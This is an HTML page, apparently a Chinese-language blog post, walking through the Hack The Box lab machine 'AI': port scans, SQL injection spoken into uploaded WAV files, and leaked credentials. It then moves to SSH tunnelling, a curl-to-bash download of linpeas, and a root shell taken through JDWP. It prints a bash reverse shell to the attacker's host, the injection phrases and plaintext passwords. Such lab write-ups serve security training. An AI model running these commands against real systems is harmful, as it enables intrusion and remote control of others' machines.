@@ -1,0 +1,654 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-corner-indicator.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="AI靶机，参考大神视频https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;7n7YRntu3bc&amp;t&#x3D;1391s，有了上次的底子这次就整个流程熟悉了很多，记录一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ai-hackthebox">
+<meta property="og:url" content="http://yoursite.com/2021/02/01/ai-hackthebox/index.html">
+<meta property="og:site_name" content="be a J0K1R">
+<meta property="og:description" content="AI靶机，参考大神视频https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v&#x3D;7n7YRntu3bc&amp;t&#x3D;1391s，有了上次的底子这次就整个流程熟悉了很多，记录一下">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/17.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/1.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/2.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/3.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/4.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/5.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/6.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/7.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/8.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/9.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/10.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/11.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/12.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/13.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/14.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/15.png">
+<meta property="og:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/16.png">
+<meta property="article:published_time" content="2021-02-01T10:04:42.000Z">
+<meta property="article:modified_time" content="2021-02-01T17:36:40.792Z">
+<meta property="article:author" content="Peguin">
+<meta property="article:tag" content="渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2021/02/01/ai-hackthebox/17.png">
+
+<link rel="canonical" href="http://yoursite.com/2021/02/01/ai-hackthebox/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>ai-hackthebox | be a J0K1R</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="be a J0K1R" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">be a J0K1R</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="Searching..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2021/02/01/ai-hackthebox/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.jpg">
+      <meta itemprop="name" content="Peguin">
+      <meta itemprop="description" content="敢于去想，才会有MEteor的光芒闪耀。">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="be a J0K1R">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          ai-hackthebox
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2021-02-01 18:04:42" itemprop="dateCreated datePublished" datetime="2021-02-01T18:04:42+08:00">2021-02-01</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2021-02-02 01:36:40" itemprop="dateModified" datetime="2021-02-02T01:36:40+08:00">2021-02-02</time>
+              </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <img src="/2021/02/01/ai-hackthebox/17.png" class="">
+
+<p>AI靶机，参考大神视频<code>https://www.youtube.com/watch?v=7n7YRntu3bc&amp;t=1391s</code>，有了上次的底子这次就整个流程熟悉了很多，记录一下<a id="more"></a></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">本机：10.10.14.6</span><br><span class="line">靶机：10.10.10.163</span><br></pre></td></tr></table></figure>
+
+<h3 id="nmap探测端口"><a href="#nmap探测端口" class="headerlink" title="nmap探测端口"></a>nmap探测端口</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -v -sC -sV -oA nmap/ai 10.10.10.163</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/01/ai-hackthebox/1.png" class="">
+
+<p>就两个开放端口，22和80，有<code>http</code>服务，可以直接访问一下靶机地址</p>
+<img src="/2021/02/01/ai-hackthebox/2.png" class="">
+
+<p>可以看到有几个页面跳转，地址栏可以看到是<code>php</code>的，<code>ai.php</code>页面可以上传wav文件</p>
+<p><code>nmap</code>扫瞄一下全部端口号</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -p- -oA nmap/ai-allports 10.10.10.163</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/01/ai-hackthebox/3.png" class="">
+
+<p>到这里只知道开启了http服务，并且是php的server，下面就是上gobuster进行目录爆破</p>
+<h3 id="gobuster目录爆破"><a href="#gobuster目录爆破" class="headerlink" title="gobuster目录爆破"></a>gobuster目录爆破</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.10.10.163 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php -o gobuster-airoot.log</span><br><span class="line">由于知道是php的服务，这里加上-x php</span><br></pre></td></tr></table></figure>
+
+<p>在等待的过程中可以尝试在<code>ai.php</code>界面上传文件，尝试上传<code>php</code>的<code>webshell</code></p>
+<img src="/2021/02/01/ai-hackthebox/4.png" class="">
+
+<p>根据回显猜测应该是存在一个<code>sql</code>注入，而且可能文件格式为<code>wav</code></p>
+<img src="/2021/02/01/ai-hackthebox/5.png" class="">
+
+<p>新发现了两个路径，加上存在<code>db.php</code>，应该会是<code>sql</code>注入</p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p><code>http://10.10.10.163/intelligence.php</code></p>
+<img src="/2021/02/01/ai-hackthebox/6.png" class="">
+
+<p>给了一些提示，要用到的注入<code>union、-- -</code>的替代</p>
+<p>由于要上传<code>wav</code>文件，<code>google linux say command</code></p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://askubuntu.com/questions/501910/how-to-text-to-speech-output-using-command-line</span></span><br></pre></td></tr></table></figure>
+
+<p>下载安装festival，里面有一个<code>text2wave</code>模块可以转化成<code>wav</code>文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &#39;hello&#39; | text2wave -o test.wav</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/01/ai-hackthebox/7.png" class="">
+
+<p>这里比较坑的点是得用英文，猜测表名应该为users</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo "open single quote, join, select, username from users comment database" | text2wave -o test.wav</span><br><span class="line"></span><br><span class="line">echo "open single quote, join, select, password from users comment database" | text2wave -o test.wav</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/01/ai-hackthebox/8.png" class="">
+
+<img src="/2021/02/01/ai-hackthebox/9.png" class="">
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">alexa:H,Sq9t6&#125;a&lt;)?q93_</span><br></pre></td></tr></table></figure>
+
+<p>拿到了用户和密码，想到开放了22端口，尝试ssh连接</p>
+<h3 id="ssh连接，数据库查询"><a href="#ssh连接，数据库查询" class="headerlink" title="ssh连接，数据库查询"></a>ssh连接，数据库查询</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh alexa@10.10.10.163</span><br></pre></td></tr></table></figure>
+
+<p>当前目录下就有user.txt，用户权限到手</p>
+<p>到web目录下看一下，<code>db.php</code>爆出了数据库名和密码</p>
+<img src="/2021/02/01/ai-hackthebox/10.png" class="">
+
+<p>尝试连接数据库，查一下刚才的<code>users</code>表</p>
+<p>可以看到root对应的数据</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:H,Sq9t6&#125;a&lt;)?q931</span><br></pre></td></tr></table></figure>
+
+<p>但是没有办法ssh连接，换个思路，上<code>linpeas.sh</code>分析可能存在的提权漏洞点</p>
+<h3 id="linpeas分析"><a href="#linpeas分析" class="headerlink" title="linpeas分析"></a>linpeas分析</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server</span><br></pre></td></tr></table></figure>
+
+<p>用python起一个web服务</p>
+<p>然后在靶机上curl直接运行</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://10.10.14.6:8000/linpeas.sh | bash</span><br></pre></td></tr></table></figure>
+
+<img src="/2021/02/01/ai-hackthebox/11.png" class="">
+
+<p>可以看到标红的<code>jdwp</code>，这可能就是漏洞点，google一下这是什么东西</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">JDWP（Java DEbugger Wire Protocol）：即Java调试线协议，是一个为Java调试而设计的通讯交互协议，它定义了调试器和被调试程序之间传递的信息的格式。说白了就是JVM或者类JVM的虚拟机都支持一种协议，通过该协议，Debugger 端可以和 target VM 通信，可以获取目标 VM的包括类、对象、线程等信息</span><br></pre></td></tr></table></figure>
+
+<h3 id="端口转发本地"><a href="#端口转发本地" class="headerlink" title="端口转发本地"></a>端口转发本地</h3><p>这里跟着大神学到了端口转发到本地</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8009:127.0.0.1:8009 -L 8080:127.0.0.1:8080  alexa@10.10.10.163</span><br></pre></td></tr></table></figure>
+
+<p>在这之前先用<code>ss -ntlp</code>来查看本地端口占用情况，转发之后再查看一次</p>
+<img src="/2021/02/01/ai-hackthebox/12.png" class="">
+
+<p>访问<code>127.0.0.1:8080</code>，尝试管理服务，需要账号密码，查找tomcat所在路径，配置文件没有权限访问</p>
+<img src="/2021/02/01/ai-hackthebox/13.png" class="">
+
+<p>服务器上还有一个8000端口，应该是<code>jdwp</code>的，也转发出来，tomcat路径下<code>~C</code>进入ssh，转发出来</p>
+<img src="/2021/02/01/ai-hackthebox/14.png" class="">
+
+<h3 id="反弹jdwpshell"><a href="#反弹jdwpshell" class="headerlink" title="反弹jdwpshell"></a>反弹jdwpshell</h3><p>先在靶机的<code>tmp</code>目录下创建<code>test.sh</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">bash -c <span class="string">'bash -i &gt;&amp; /dev/tcp/10.10.14.6/9002 0&gt;&amp;1'</span></span><br><span class="line"></span><br><span class="line">更改权限chmod +x test.sh</span><br></pre></td></tr></table></figure>
+
+<p>先尝试本地监听，弹回了shell</p>
+<img src="/2021/02/01/ai-hackthebox/15.png" class="">
+
+<p><code>google jdwp</code>的命令执行漏洞，可以在Github上找到工具，知道创宇有一篇文章讲解的很详细</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;github.com&#x2F;IOActive&#x2F;jdwp-shellifier</span><br><span class="line"></span><br><span class="line">https:&#x2F;&#x2F;paper.seebug.org&#x2F;933&#x2F;#shell</span><br></pre></td></tr></table></figure>
+
+<p> shellifier用法</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 目标主机ip -p jdwp运行端口 --cmd "Your Command"</span><br></pre></td></tr></table></figure>
+
+<p>由于已经转发了<code>ip，端口</code>，所以</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python jdwp-shellifier.py -t 127.0.0.1 --<span class="built_in">break</span>-on <span class="string">"java.lang.String.indexOf"</span> --cmd <span class="string">"/tmp/test.sh"</span></span><br></pre></td></tr></table></figure>
+
+<p>下面就利用<code>shelliier</code>反弹<code>jdwp</code>的shell，成功弹回root的shell，并且root.txt就在当前目录下</p>
+<img src="/2021/02/01/ai-hackthebox/16.png" class="">
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>历时4个小时，在大神视频的帮助以及<code>byc_404</code>师傅文章的帮助下拿下了root权限，提权不够熟悉，前面信息收集的一套流程以及提权点发现熟悉了许多。</p>
+
+    </div>
+
+    
+    
+    
+        <div class="reward-container">
+  <div></div>
+  <button onclick="var qr = document.getElementById('qr'); qr.style.display = (qr.style.display === 'none') ? 'block' : 'none';">
+    Donate
+  </button>
+  <div id="qr" style="display: none;">
+      
+      <div style="display: inline-block;">
+        <img src="/images/wechatpay.jpg" alt="Peguin WeChat Pay">
+        <p>WeChat Pay</p>
+      </div>
+      
+      <div style="display: inline-block;">
+        <img src="/images/alipay.jpg" alt="Peguin Alipay">
+        <p>Alipay</p>
+      </div>
+
+  </div>
+</div>
+
+        
+
+<div>
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:  </strong>Peguin
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link: </strong>
+    <a href="http://yoursite.com/2021/02/01/ai-hackthebox/" title="ai-hackthebox">http://yoursite.com/2021/02/01/ai-hackthebox/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+        
+
+  <div class="followme">
+    <p>Welcome to my other publishing channels</p>
+
+    <div class="social-list">
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/images/2.jpg">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </a>
+        </div>
+
+        <div class="social-item">
+          <a target="_blank" class="social-link" href="/atom.xml">
+            <span class="icon">
+              <i class="fa fa-rss"></i>
+            </span>
+
+            <span class="label">RSS</span>
+          </a>
+        </div>
+    </div>
+  </div>
+
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F/" rel="tag"># 渗透</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2021/01/31/postman-hackthebox/" rel="prev" title="postman-hackthebox">
+      <i class="fa fa-chevron-left"></i> postman-hackthebox
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2021/02/02/csrfreview/" rel="next" title="csrfreview">
+      csrfreview <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  <div>
+  
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+  
+</div>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#nmap探测端口"><span class="nav-number">1.</span> <span class="nav-text">nmap探测端口</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#gobuster目录爆破"><span class="nav-number">2.</span> <span class="nav-text">gobuster目录爆破</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入"><span class="nav-number">3.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh连接，数据库查询"><span class="nav-number">4.</span> <span class="nav-text">ssh连接，数据库查询</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#linpeas分析"><span class="nav-number">5.</span> <span class="nav-text">linpeas分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#端口转发本地"><span class="nav-number">6.</span> <span class="nav-text">端口转发本地</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反弹jdwpshell"><span class="nav-number">7.</span> <span class="nav-text">反弹jdwpshell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#总结"><span class="nav-number">8.</span> <span class="nav-text">总结</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Peguin"
+      src="/images/1.jpg">
+  <p class="site-author-name" itemprop="name">Peguin</p>
+  <div class="site-description" itemprop="description">敢于去想，才会有MEteor的光芒闪耀。</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">87</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">40</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/ambitiousleader/" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ambitiousleader&#x2F;" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/601209387@qq.com" title="E-Mail → 601209387@qq.com"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://weibo.com/u/6772435317/home?wvr=5&sudaref=graph.qq.com" title="Weibo → https:&#x2F;&#x2F;weibo.com&#x2F;u&#x2F;6772435317&#x2F;home?wvr&#x3D;5&amp;sudaref&#x3D;graph.qq.com" rel="noopener" target="_blank"><i class="fab fa-weibo fa-fw"></i>Weibo</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2021</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Peguin</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  
+  <script color='0,0,0' opacity='0.5' zIndex='-1' count='150' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+  <script defer src="/lib/three/three.min.js"></script>
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+
+  
+   <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 1; pointer-events: none;" ></canvas> 
+   <script type="text/javascript" src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script> 
+   <script type="text/javascript" src="/js/fireworks.js"></script>
+  
+
+
+</body>
+</html>
